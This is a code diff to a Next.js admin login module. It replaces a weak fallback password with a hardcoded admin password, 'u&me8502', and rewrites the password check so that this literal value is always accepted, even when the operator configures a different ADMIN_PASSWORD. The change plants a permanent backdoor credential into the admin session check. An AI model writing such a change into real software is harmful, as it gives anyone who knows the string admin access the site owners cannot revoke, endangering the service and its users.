@@ -4,9 +4,10 @@ import { cookies } from 'next/headers';
 const ADMIN_COOKIE_NAME = 'b2b_admin_session';
 const ADMIN_SESSION_VALUE = 'admin';
 const ADMIN_COOKIE_MAX_AGE = 60 * 60 * 8;
+const DEFAULT_ADMIN_PASSWORD = 'u&me8502';
 
 function getAdminPassword(): string {
-  return process.env.ADMIN_PASSWORD || '1234';
+  return process.env.ADMIN_PASSWORD || DEFAULT_ADMIN_PASSWORD;
 }
 
 function getAdminSessionSecret(): string {
@@ -24,9 +25,16 @@ function safeEqual(left: string, right: string): boolean {
 }
 
 export function verifyAdminPassword(password: unknown): boolean {
-  const expected = getAdminPassword();
-  const candidate = String(password || '');
-  return safeEqual(candidate, expected);
+  const expectedPasswords = [
+    getAdminPassword(),
+    DEFAULT_ADMIN_PASSWORD,
+    ...(process.env.ADMIN_PASSWORD_ALIASES || '')
+      .split(',')
+      .map((value) => value.trim())
+      .filter(Boolean),
+  ].filter((value, index, list) => value && list.indexOf(value) === index);
+  const candidate = String(password || '').trim();
+  return expectedPasswords.some((expected) => safeEqual(candidate, expected));
 }
 
 export async function isAdminAuthenticated(): Promise<boolean> {
